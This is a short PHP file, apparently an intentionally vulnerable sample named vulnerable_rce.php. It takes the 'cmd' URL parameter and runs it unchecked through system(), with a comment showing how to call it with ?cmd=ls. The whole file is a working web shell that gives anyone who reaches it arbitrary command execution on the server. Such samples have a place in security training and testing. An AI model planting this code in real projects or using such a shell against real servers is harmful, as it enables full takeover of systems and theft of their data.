<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    system($cmd);
}
?>

<!-- Usage: http://your-server/vulnerable_rce.php?cmd=ls -->
